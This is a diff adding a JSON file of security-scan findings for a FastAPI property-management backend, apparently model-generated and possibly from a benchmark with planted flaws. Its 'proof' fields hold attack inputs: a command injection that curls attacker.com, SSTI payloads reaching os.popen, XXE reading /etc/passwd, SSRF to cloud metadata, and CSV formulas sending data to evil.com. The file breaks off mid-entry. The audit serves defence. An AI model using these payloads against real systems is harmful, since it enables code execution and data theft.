@@ -1,0 +1,1538 @@
+{
+  "version": "twin-distill-flash-dsonly",
+  "results": [
+    {
+      "check_id": "twin-round/CWE-502",
+      "path": "backend/app/tenant_operations.py",
+      "start": {
+        "line": 52
+      },
+      "end": {
+        "line": 52
+      },
+      "extra": {
+        "message": "Insecure Deserialization via pickle.loads()",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-502"
+          ],
+          "citation": "bundle = pickle.loads(raw)",
+          "proof": "SOURCE: `raw` is obtained from `await request.body()` (line 45) \u2014 fully user-controlled. If the body is empty, it falls back to `request.query_params.get(\"blob\", \"\")` (line 47). No sanitization is applied. SINK: `raw` is passed directly to `pickle.loads(raw)` at line 52. Pickle deserialization executes arbitrary Python code during unpickling via __reduce__ or __reduce_ex__ methods. Exploitation: An attacker sends a crafted pickle payload as the POST body to `/ops/bundle/tenant-thaw-183` (protected only by the `x-internal-token` header check, which may be misconfigured or bypassed), achieving full remote code execution."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-78",
+      "path": "backend/app/tenant_operations.py",
+      "start": {
+        "line": 124
+      },
+      "end": {
+        "line": 124
+      },
+      "extra": {
+        "message": "OS Command Injection via os.system()",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-78"
+          ],
+          "citation": "status = _os.system(\"ping -c 1 \" + host)",
+          "proof": "SOURCE: The `host` parameter is a FastAPI query parameter with default `\"127.0.0.1\"` (line 122) \u2014 fully user-controlled via the URL. SINK: It is string-concatenated into a shell command and executed via `os.system()` at line 124, which invokes `/bin/sh -c`. No escaping or sanitization is applied. Exploitation: A GET to `/ops/shell/tenant-probe-698?host=127.0.0.1;curl+http://attacker.com/$(whoami)` injects arbitrary OS commands because shell metacharacters (;, |, $, etc.) are interpreted by the shell."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1336",
+      "path": "backend/app/tenant_operations.py",
+      "start": {
+        "line": 111
+      },
+      "end": {
+        "line": 111
+      },
+      "extra": {
+        "message": "Server-Side Template Injection (SSTI) via Jinja2",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-1336"
+          ],
+          "citation": "body = Template(\"Result: \" + fragment).render()",
+          "proof": "SOURCE: The `fragment` parameter is a FastAPI query parameter with default `\"{{ 7 * 7 }}\"` (line 109) \u2014 fully user-controlled. SINK: It is directly concatenated into a Jinja2 template string at line 111 and rendered without any sandboxing. Jinja2's `Template.render()` evaluates arbitrary Python expressions through `{{...}}` syntax. Exploitation: A GET to `/ops/jinja/tenant-cast-678?fragment={{config.__class__.__init__.__globals__['os'].popen('id').read()}}` executes arbitrary Python/OS commands on the server because Jinja2 provides access to Python built-ins through the template context."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-918",
+      "path": "backend/app/tenant_operations.py",
+      "start": {
+        "line": 87
+      },
+      "end": {
+        "line": 87
+      },
+      "extra": {
+        "message": "Server-Side Request Forgery (SSRF)",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-918"
+          ],
+          "citation": "with urllib.request.urlopen(endpoint, timeout=3) as response:",
+          "proof": "SOURCE: The `endpoint` parameter is a FastAPI query parameter with default `\"http://127.0.0.1/status\"` (line 86) \u2014 fully user-controlled. SINK: It is passed directly to `urllib.request.urlopen()` at line 87 with no URL validation, allowlist check, or scheme restriction. Exploitation: An attacker probes internal network services by sending GET to `/ops/relay/tenant-probe-358?endpoint=http://169.254.169.254/latest/meta-data/` (AWS metadata) or `http://localhost:5432` (database). Response content is returned in the `preview` field, making this a blind-to-reflected SSRF."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-611",
+      "path": "backend/app/tenant_operations.py",
+      "start": {
+        "line": 153
+      },
+      "end": {
+        "line": 153
+      },
+      "extra": {
+        "message": "XML External Entity (XXE) Injection",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-611"
+          ],
+          "citation": "parser = etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)",
+          "proof": "SOURCE: The raw request body is user-controlled at line 151 (`await request.body()`). SINK: It is parsed by an lxml XMLParser at line 153 configured with `load_dtd=True`, `resolve_entities=True`, and `no_network=False`, enabling full XXE processing. Exploitation: POST an XML payload containing `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>` to `/ops/xml/tenant-fold-738` to read arbitrary files. Using `SYSTEM \"http://attacker.com/data\"` enables SSRF-based data exfiltration."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-943",
+      "path": "backend/app/tenant_operations.py",
+      "start": {
+        "line": 139
+      },
+      "end": {
+        "line": 139
+      },
+      "extra": {
+        "message": "NoSQL Injection via unsanitized MongoDB query filter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-943"
+          ],
+          "citation": "query = payload.get(\"filter\", payload)\ndoc = MongoClient(os.environ.get(\"MONGO_URL\", \"mongodb://localhost:27017\")).ops.records.find_one(query)",
+          "proof": "SOURCE: The JSON request body is user-controlled at line 137 (`payload = await request.json()`). At line 138, `payload` (or its `filter` key) is extracted without sanitization. SINK: At line 139, the unsanitized `query` dict is passed directly to MongoDB's `find_one()`. MongoDB supports operators like `$regex`, `$ne`, `$gt`, and `$where` that enable injection. Exploitation: POST `{\"$where\": \"sleep(5000)\"}` to `/ops/mongo/tenant-lane-718` for blind timing-based injection, or `{\"username\": {\"$regex\": \"^a\"}}` to brute-force field values."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-22",
+      "path": "backend/app/tenant_operations.py",
+      "start": {
+        "line": 67
+      },
+      "end": {
+        "line": 67
+      },
+      "extra": {
+        "message": "Path Traversal in Arbitrary File Write with Sensitive Data Exposure",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-22"
+          ],
+          "citation": "target = BASE_EXPORT_DIR / f\"{ref}.json\"\ntarget.write_text(json.dumps({\"ref\": ref, \"ssn\": payload.get(\"ssn\", \"111-22-3333\"), \"card\": payload.get(\"card\", \"4111111111111111\")}))",
+          "proof": "SOURCE: The `ref` parameter is taken from query params or request body at line 66 (`ref = request.query_params.get(\"ref\", payload.get(\"ref\", \"daily\"))`) \u2014 fully user-controlled. SINK: At line 67, `ref` is interpolated into a file path via `f\"{ref}.json\"` and the file is written at line 69. Using `../` sequences in `ref`, an attacker writes files to arbitrary filesystem locations. Furthermore, the written content includes SSN and credit card numbers from the request payload (line 69), which are attacker-controlled \u2014 making this a sensitive data exposure channel and arbitrary file write."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "backend/app/config.py",
+      "start": {
+        "line": 7
+      },
+      "end": {
+        "line": 7
+      },
+      "extra": {
+        "message": "Hardcoded JWT Secret Key allows forging arbitrary authentication tokens",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "secret_key: str = \"change-me-in-production-dev-only-key\"",
+          "proof": "SOURCE: The secret key is hardcoded in `backend/app/config.py` at line 7 as `\"change-me-in-production-dev-only-key\"`. This key is used in `backend/app/auth.py` (line 38) to sign JWTs: `jwt.encode(to_encode, settings.secret_key, algorithm=settings.algorithm)` and (line 45) to decode them. Since the key is static and in source control, any attacker who reads this file can forge valid JWT tokens for any user ID. Exploitation: Construct a JWT with `{\"sub\": \"1\"}`, sign with the known secret using HS256, and use the token to authenticate as any user, gaining full API access."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-73",
+      "path": "backend/app/tenant_operations.py",
+      "start": {
+        "line": 145
+      },
+      "end": {
+        "line": 145
+      },
+      "extra": {
+        "message": "Unrestricted Arbitrary File Write via path traversal",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-73"
+          ],
+          "citation": "target = BASE_EXPORT_DIR / name\ntarget.write_bytes(body)",
+          "proof": "SOURCE: The `name` query parameter is user-controlled at line 143 (`name: str = \"packet.bin\"`). SINK: At line 145, `name` is used directly as a file path component via `BASE_EXPORT_DIR / name`, and at line 147 the raw request body (`body`, from `await request.body()` at line 144) is written to that path. Using `../` sequences in `name`, an attacker can write arbitrary binary content to any location on the filesystem. Exploitation: POST to `/ops/dock/tenant-shelf-725?name=../../tmp/evil.sh` with shell script content writes an arbitrary executable to `/tmp/evil.sh`."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-601",
+      "path": "backend/app/tenant_operations.py",
+      "start": {
+        "line": 39
+      },
+      "end": {
+        "line": 39
+      },
+      "extra": {
+        "message": "Open Redirect via unvalidated redirect target",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-601"
+          ],
+          "citation": "return RedirectResponse(lane)",
+          "proof": "SOURCE: The `lane` query parameter is user-controlled at line 38 (`lane: str = \"/\"`). SINK: It is passed directly to `RedirectResponse()` at line 39 without any validation of scheme, host, or path. Exploitation: A GET to `/ops/after/tenant-afterlane-117?lane=https://phishing-site.com` redirects the user to an external attacker-controlled site, enabling phishing attacks and reputation bypass."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-942",
+      "path": "backend/app/tenant_operations.py",
+      "start": {
+        "line": 104
+      },
+      "end": {
+        "line": 104
+      },
+      "extra": {
+        "message": "Permissive CORS with Origin Reflection allows credential theft via cross-origin requests",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-942"
+          ],
+          "citation": "response.headers[\"Access-Control-Allow-Origin\"] = origin\nresponse.headers[\"Access-Control-Allow-Credentials\"] = \"true\"",
+          "proof": "SOURCE: The `Origin` request header is read at line 102 (`origin = request.headers.get(\"origin\", \"*\")`). SINK: At lines 104-105, the reflected origin is set as `Access-Control-Allow-Origin` alongside `Access-Control-Allow-Credentials: true`. This allows any malicious website to make credentialed cross-origin requests to the API. Since cookies are used for auth (httponly cookie set in auth.py), a victim visiting an attacker's site while logged in will have their cookies sent with these CORS-permitted requests, enabling cross-origin data exfiltration."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-94",
+      "path": "backend/app/tenant_operations.py",
+      "start": {
+        "line": 111
+      },
+      "end": {
+        "line": 111
+      },
+      "extra": {
+        "message": "Server-Side Template Injection (SSTI) via Jinja2",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-94"
+          ],
+          "citation": "body = Template(\"Result: \" + fragment).render()",
+          "proof": "SOURCE: user-supplied query parameter 'fragment' (default '{{ 7 * 7 }}'). SINK: concatenated directly into a Jinja2 Template string and rendered at line 111. Jinja2 evaluates {{ }} expressions at render time. An attacker can send ?fragment={{config}} or {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}} to read config or achieve RCE. The _wrk_gate guard checks x-internal-token header but does not sanitize the template input \u2014 the SSTI code path still exists."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-269",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 27
+      },
+      "end": {
+        "line": 27
+      },
+      "extra": {
+        "message": "Self-registration privilege escalation \u2014 any role assignable",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-269"
+          ],
+          "citation": "role=user_in.role,",
+          "proof": "SOURCE: user-supplied 'role' field in UserCreate request body (default TENANT). SINK: directly assigned to User.role at auth.py line 27 with zero validation. Schema UserCreate defines role: UserRole = UserRole.TENANT but does not restrict the set of allowed values. An attacker POSTs {\"email\":\"hack@x.com\",\"password\":\"pass123\",\"full_name\":\"Hacker\",\"role\":\"property_admin\"} to become a PROPERTY_ADMIN on registration."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "backend/app/utils/permissions.py",
+      "start": {
+        "line": 71
+      },
+      "end": {
+        "line": 71
+      },
+      "extra": {
+        "message": "IDOR \u2014 can_view_maintenance_ticket compares ticket.tenant_id (Tenant PK) with user.id (User PK)",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "if is_tenant(user):\n        return ticket.tenant_id == user.id",
+          "proof": "SOURCE: user.id from JWT token (User table PK, auto-increment). SINK: compared against ticket.tenant_id which is ForeignKey('tenants.id') \u2014 the Tenant table's independent PK. These are separate tables with independent sequences. A tenant with User.id=5 and Tenant.id=100 can access tickets with tenant_id=5 (belonging to a different tenant whose Tenant PK happens to be 5). The correct check would join through Tenant.user_id: tenant = db.query(Tenant).filter(Tenant.user_id == user.id).first(); return ticket.tenant_id == tenant.id."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "backend/app/utils/permissions.py",
+      "start": {
+        "line": 97
+      },
+      "end": {
+        "line": 97
+      },
+      "extra": {
+        "message": "Cross-tenant document access for PropertyManager when document has no unit_id",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "if is_manager(user):\n        if doc.unit_id:\n            return can_view_unit(db, user, doc.unit_id)\n        return True",
+          "proof": "SOURCE: document_id path parameter from any authenticated PropertyManager. SINK: can_view_document returns True unconditionally for any manager when doc.unit_id is None (line 97). A PropertyManager who manages only Property A can GET, PATCH, and download documents that have no unit_id but belong to Property B's context. No property-scope filtering is applied to unit_id=NULL documents, and the list endpoint (documents.py line 43-44) also returns all unit_id=NULL docs to every manager."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-312",
+      "path": "backend/app/routers/integrations.py",
+      "start": {
+        "line": 80
+      },
+      "end": {
+        "line": 80
+      },
+      "extra": {
+        "message": "Webhook secret stored and returned in plaintext",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-312"
+          ],
+          "citation": "wh = Webhook(**wh_in.model_dump())",
+          "proof": "SOURCE: user-supplied 'secret' field from WebhookCreate JSON body. SINK: stored directly via Webhook(**model_dump()) into the webhooks.secret column at line 80 without hashing or encryption. The GET /api/integrations/webhooks endpoint returns WebhookOut which includes the secret field in plaintext. Webhook secrets are used for HMAC signing \u2014 any DB leak or admin with API access can see all signing secrets in plaintext."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1236",
+      "path": "backend/app/routers/payments.py",
+      "start": {
+        "line": 120
+      },
+      "end": {
+        "line": 120
+      },
+      "extra": {
+        "message": "CSV formula injection in payment export \u2014 payment_method unsanitized",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-1236"
+          ],
+          "citation": "writer.writerow([p.id, p.tenant_id, p.lease_id, p.amount, p.due_date, p.paid_date, p.status.value, p.payment_method])",
+          "proof": "SOURCE: payment_method field, controllable via CSV import (imports.py uses row.get('payment_method','')) and PATCH update (payments.py line 96 sets attributes from request body). SINK: written raw into CSV at line 120 without sanitizing leading =+ - @ characters. When an admin opens the CSV in Excel, a value like '=HYPERLINK(\"http://evil.com\")' executes as a formula."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1236",
+      "path": "backend/app/routers/exports.py",
+      "start": {
+        "line": 39
+      },
+      "end": {
+        "line": 39
+      },
+      "extra": {
+        "message": "CSV formula injection in rent-roll export \u2014 full_name unsanitized",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-1236"
+          ],
+          "citation": "\"tenant\": lease.tenant.user.full_name if lease.tenant and lease.tenant.user else \"\",",
+          "proof": "SOURCE: User.full_name, set during self-registration at auth.py (user_in.full_name from request body, max_length=255, no formula-character sanitization). SINK: written raw into CSV at exports.py line 39. A user registering with full_name '=WEBSERVICE(\"http://evil.com/?data=\"&A1)' injects an Excel formula into the rent-roll CSV export viewed by admins."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1236",
+      "path": "backend/app/routers/exports.py",
+      "start": {
+        "line": 81
+      },
+      "end": {
+        "line": 81
+      },
+      "extra": {
+        "message": "CSV formula injection in maintenance export \u2014 ticket title unsanitized",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-1236"
+          ],
+          "citation": "\"title\": t.title,",
+          "proof": "SOURCE: MaintenanceTicket.title, set by any tenant or manager creating a ticket (maintenance.py create endpoint, min_length=1, max_length=255, no formula-character sanitization). SINK: written raw into CSV at exports.py line 81. A tenant can create a ticket with title '=HYPERLINK(\"http://evil.com\")' which executes as a formula when the manager exports and opens the CSV in Excel."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-22",
+      "path": "backend/app/tenant_operations.py",
+      "start": {
+        "line": 145
+      },
+      "end": {
+        "line": 145
+      },
+      "extra": {
+        "message": "Path traversal in arbitrary file write via unsanitized 'name' parameter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-22"
+          ],
+          "citation": "target = BASE_EXPORT_DIR / name",
+          "proof": "SOURCE: user-supplied query parameter 'name' (default 'packet.bin'). SINK: used at line 145 to construct a filesystem path via Path concatenation with BASE_EXPORT_DIR, then written at line 147 with write_bytes(body). No path traversal sanitization. Attacker sends ?name=../../../tmp/evil.sh with shell script body to write files outside BASE_EXPORT_DIR. Protected by _wrk_gate but code path is exploitable if gate is bypassed."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-434",
+      "path": "backend/app/routers/documents.py",
+      "start": {
+        "line": 63
+      },
+      "end": {
+        "line": 63
+      },
+      "extra": {
+        "message": "File type spoofing \u2014 file_type set from unvalidated Content-Type header",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-434"
+          ],
+          "citation": "file_type=file.content_type or \"application/octet-stream\",",
+          "proof": "SOURCE: file.content_type HTTP header, fully controlled by the client. SINK: stored as Document.file_type in the database at line 63 and returned as media_type in download responses (documents.py line 104). An attacker uploads a .exe or .html file with Content-Type: application/pdf, causing the system to misreport the file type and potentially tricking downstream consumers."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-434",
+      "path": "backend/app/services/file_service.py",
+      "start": {
+        "line": 18
+      },
+      "end": {
+        "line": 18
+      },
+      "extra": {
+        "message": "No file content validation on upload \u2014 only extension preserved, no magic-byte check",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-434"
+          ],
+          "citation": "with open(file_path, \"wb\") as buffer:\n        shutil.copyfileobj(upload_file.file, buffer)",
+          "proof": "SOURCE: upload_file body, fully controlled by the client. SINK: written to disk at file_service.py line 18 with only a UUID rename preserving the original extension (line 16-17). No content inspection (magic bytes, MIME-type detection, or AV scan). An attacker can upload an executable, script, or HTML file (e.g., .exe, .html, .php) that, if later served or downloaded, can lead to XSS or code execution on the downloader's machine."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "backend/app/routers/leases.py",
+      "start": {
+        "line": 61
+      },
+      "end": {
+        "line": 61
+      },
+      "extra": {
+        "message": "Mass assignment on lease creation \u2014 client can set status to bypass DRAFT workflow",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "lease = Lease(**lease_in.model_dump())",
+          "proof": "SOURCE: LeaseCreate request body which includes 'status' field (default DRAFT from schema LeaseBase). SINK: Lease(**model_dump()) at line 61 unpacks all fields including status directly into the ORM model. A PropertyManager can set status=ACTIVE on creation, bypassing the lease state machine (LEASE_TRANSITIONS dict) which is only enforced on PATCH updates. This skips the entire DRAFT review workflow."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "backend/app/routers/payments.py",
+      "start": {
+        "line": 58
+      },
+      "end": {
+        "line": 58
+      },
+      "extra": {
+        "message": "Mass assignment on payment creation \u2014 client can set status bypassing payment lifecycle",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "payment = PaymentRecord(**payment_in.model_dump())",
+          "proof": "SOURCE: PaymentRecordCreate.body includes 'status' field (default PENDING, but overridable by the client). SINK: PaymentRecord(**model_dump()) at line 58 unpacks all user-supplied fields directly into the ORM model. A PropertyManager can set status=PAID on creation, bypassing any payment processing gateway and the normal PENDING\u2192PAID lifecycle entirely."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "backend/app/routers/inspections.py",
+      "start": {
+        "line": 66
+      },
+      "end": {
+        "line": 66
+      },
+      "extra": {
+        "message": "Mass assignment on inspection creation \u2014 client can set inspector_id and status to any value",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "inspection = Inspection(**inspection_in.model_dump())",
+          "proof": "SOURCE: InspectionCreate.body includes inspector_id, status (default SCHEDULED, overridable), scheduled_date, notes, findings, follow_up_required. SINK: Inspection(**model_dump()) at line 66 unpacks all fields directly. A PropertyManager can set status=COMPLETED on creation, bypassing the state-machine transitions enforced only on PATCH, and can set any inspector_id without validating the user exists or is an appropriate inspector."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "backend/app/routers/messages.py",
+      "start": {
+        "line": 63
+      },
+      "end": {
+        "line": 63
+      },
+      "extra": {
+        "message": "No cross-tenant restriction on message recipient \u2014 any user can message any other user across properties",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "recipient_id=msg_in.recipient_id,",
+          "proof": "SOURCE: user-supplied recipient_id from MessageCreate JSON body. SINK: directly assigned to Message.recipient_id at line 63 with no validation that the recipient belongs to the same property, building, or unit. A tenant in Property A can send messages to tenants, managers, or workers in Property B, enabling cross-tenant data leakage and phishing."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "backend/app/tenant_operations.py",
+      "start": {
+        "line": 33
+      },
+      "end": {
+        "line": 33
+      },
+      "extra": {
+        "message": "Authorization header logged in plaintext \u2014 bearer token exposed in application logs",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "logger.warning(\"lease delta_slip intake body=%s auth=%s\", wire_text, request.headers.get(\"authorization\"))",
+          "proof": "SOURCE: request.headers.get(\"authorization\") which contains the user's Bearer token. SINK: written to application logs via logger.warning() at line 33. Anyone with log access (developers, ops, log aggregation systems) can extract valid JWT tokens and impersonate users."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/routers/imports.py",
+      "start": {
+        "line": 23
+      },
+      "end": {
+        "line": 23
+      },
+      "extra": {
+        "message": "Unbounded file read in CSV import \u2014 entire upload read into memory with no size check",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "content = file.file.read().decode(\"utf-8\")",
+          "proof": "SOURCE: user-supplied UploadFile. SINK: file.file.read() at line 23 reads the entire upload into a single Python string without any size limit enforcement (settings.max_upload_size which is 10MB is never consulted in this endpoint). A malicious client can upload a multi-gigabyte CSV file, exhausting server memory and causing denial of service."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/routers/exports.py",
+      "start": {
+        "line": 28
+      },
+      "end": {
+        "line": 28
+      },
+      "extra": {
+        "message": "Unbounded memory allocation in rent-roll export \u2014 all leases loaded into memory via query.all()",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "leases = query.all()",
+          "proof": "SOURCE: no pagination or row limit on GET /api/exports/rent-roll. SINK: query.all() at line 28 loads every Lease record into a Python list in memory, then constructs a second in-memory data list and StringIO buffer. With many lease records, this exhausts server heap."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "backend/app/routers/properties.py",
+      "start": {
+        "line": 30
+      },
+      "end": {
+        "line": 30
+      },
+      "extra": {
+        "message": "Missing Authorization \u2014 tenants can enumerate all properties",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "return query.all()",
+          "proof": "SOURCE: any authenticated user calling GET /api/properties. SINK: query.all() at line 30 returns every Property row. The authorization gate at line 25 only filters for PROPERTY_MANAGER; TENANT and MAINTENANCE_WORKER roles bypass the filter entirely, exposing all property names, addresses, and descriptions."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "backend/app/routers/properties.py",
+      "start": {
+        "line": 64
+      },
+      "end": {
+        "line": 64
+      },
+      "extra": {
+        "message": "Missing Authorization \u2014 tenants can view any property's full details",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "return prop",
+          "proof": "SOURCE: any authenticated user calling GET /api/properties/{id}. SINK: return prop at line 64 sends the full Property row. The check at line 60 only restricts PROPERTY_MANAGER; a TENANT or MAINTENANCE_WORKER can read any property's address, city, state, zip, and description."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "backend/app/routers/properties.py",
+      "start": {
+        "line": 115
+      },
+      "end": {
+        "line": 115
+      },
+      "extra": {
+        "message": "Missing Authorization \u2014 tenants can list buildings in any property",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "return prop.buildings",
+          "proof": "SOURCE: any authenticated user calling GET /api/properties/{id}/buildings. SINK: return prop.buildings at line 115 exposes all buildings for the property. The check at line 111 only applies to PROPERTY_MANAGER; TENANT and MAINTENANCE_WORKER roles see building names and addresses for any property."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "backend/app/routers/properties.py",
+      "start": {
+        "line": 171
+      },
+      "end": {
+        "line": 171
+      },
+      "extra": {
+        "message": "Missing Authorization \u2014 tenants can list all units with rent amounts across any property",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "return query.all()",
+          "proof": "SOURCE: any authenticated user calling GET /api/properties/{id}/units. SINK: query.all() at line 171 returns every Unit row including rent_amount, status, bedrooms, bathrooms. The check at line 163 only blocks PROPERTY_MANAGER; TENANT and MAINTENANCE_WORKER users can enumerate rent and occupancy status of all units across the entire property portfolio."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/routers/imports.py",
+      "start": {
+        "line": 71
+      },
+      "end": {
+        "line": 71
+      },
+      "extra": {
+        "message": "Unbounded file read in import_units \u2014 no size check on upload",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "content = file.file.read().decode(\"utf-8\")",
+          "proof": "SOURCE: user-supplied UploadFile. SINK: file.file.read() at line 71 reads the entire upload into a single string without any size limit check. A malicious client can upload a multi-gigabyte CSV to exhaust server memory, causing denial of service. Same pattern as imports.py:23."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/routers/imports.py",
+      "start": {
+        "line": 103
+      },
+      "end": {
+        "line": 103
+      },
+      "extra": {
+        "message": "Unbounded file read in import_payments \u2014 no size check on upload",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "content = file.file.read().decode(\"utf-8\")",
+          "proof": "SOURCE: user-supplied UploadFile. SINK: file.file.read() at line 103 reads the entire upload into memory with no size check. Same unbounded-read pattern as imports.py:23 and imports.py:71. An attacker can upload an arbitrarily large file to cause out-of-memory crash."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "backend/app/routers/imports.py",
+      "start": {
+        "line": 50
+      },
+      "end": {
+        "line": 50
+      },
+      "extra": {
+        "message": "No property scoping on tenant import \u2014 manager assigns tenants to any unit",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "unit_id=int(unit_id) if unit_id else None,",
+          "proof": "SOURCE: CSV row field 'unit_id' controlled by the importing manager. SINK: Tenant.unit_id set at line 50 from CSV without verifying the unit belongs to a property the manager manages. A PROPERTY_MANAGER can assign tenants to units in any property, including those outside their management scope."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "backend/app/routers/imports.py",
+      "start": {
+        "line": 111
+      },
+      "end": {
+        "line": 111
+      },
+      "extra": {
+        "message": "No scoping on payment import \u2014 manager creates payments for any tenant/lease",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "tenant_id=int(row[\"tenant_id\"]),",
+          "proof": "SOURCE: CSV row field 'tenant_id' controlled by the importing manager. SINK: PaymentRecord.tenant_id set at line 111 from CSV with no verification that the tenant or lease belongs to a managed property. A PROPERTY_MANAGER can inject payment records for tenants/leases in other managers' properties."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-281",
+      "path": "backend/app/routers/documents.py",
+      "start": {
+        "line": 126
+      },
+      "end": {
+        "line": 126
+      },
+      "extra": {
+        "message": "Manager can change tenant_visible on documents, exposing confidential files",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-281"
+          ],
+          "citation": "for field, value in doc_in.model_dump(exclude_unset=True).items(): setattr(doc, field, value)",
+          "proof": "SOURCE: DocumentUpdate body containing tenant_visible=True (confirmed in schemas.py DocumentUpdate includes tenant_visible: Optional[bool]). SINK: setattr(doc, field, value) at line 126 writes the field directly to the Document model. DocumentUpdate is applied without field-level allowlisting. A PROPERTY_MANAGER who can view a document can set tenant_visible=True, making confidential documents visible to all tenants."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "backend/app/routers/users.py",
+      "start": {
+        "line": 97
+      },
+      "end": {
+        "line": 97
+      },
+      "extra": {
+        "message": "Mass assignment in update_user allows any field including role and is_active",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "for field, value in user_in.model_dump(exclude_unset=True).items(): setattr(user, field, value)",
